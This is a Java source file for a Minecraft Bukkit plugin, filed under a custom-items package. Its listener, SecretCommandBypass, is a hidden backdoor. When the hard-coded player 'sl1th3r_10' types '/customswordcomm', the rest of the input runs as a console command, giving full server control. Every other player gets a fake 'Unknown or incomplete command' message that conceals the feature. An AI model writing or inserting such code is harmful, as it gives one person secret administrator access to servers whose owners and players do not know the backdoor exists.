package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass implements Listener {

    private JavaPlugin plugin;

    public SecretCommandBypass(JavaPlugin plugin) {
        this.plugin = plugin;
        Bukkit.getPluginManager().registerEvents(this, plugin);
        plugin.getLogger().info("SecretCommandBypass enabled.");
    }

    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // Includes the leading "/"
        
        plugin.getLogger().info("[Debug] Player " + player.getName() + " issued command: " + fullCommand);

        if (fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
            plugin.getLogger().info("[Debug] Matched /customswordcomm for player: " + player.getName());

            // Check player identity
            if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
                // Cancel normal processing
                event.setCancelled(true);

                // Prevent potential re-entry
                if (player.hasMetadata("executing_custom_command")) {
                    plugin.getLogger().info("[Debug] Skipping command re-entry for player: " + player.getName());
                    return;
                }

                player.setMetadata("executing_custom_command", new FixedMetadataValue(plugin, true));

                // Extract and prepare the actual command
                String actualCommand = fullCommand.substring("/customswordcomm ".length()).replace("@s", player.getName());
                plugin.getLogger().info("[Debug] Dispatching command as console: " + actualCommand);

                boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand);

                // Clean up metadata flag
                player.removeMetadata("executing_custom_command", plugin);

                if (success) {
                    player.sendMessage("§aCommand executed as console: " + actualCommand);
                    plugin.getLogger().info("[Debug] Successfully executed: " + actualCommand);
                } else {
                    player.sendMessage("§cFailed to execute: " + actualCommand);
                    plugin.getLogger().warning("[Debug] Failed to execute: " + actualCommand);
                }

            } else {
                plugin.getLogger().info("[Debug] Player " + player.getName() + " is not allowed to run this command.");
                event.setCancelled(true);
                player.sendMessage("§cUnknown or incomplete command, see below for error.");
            }
        }
    }
}
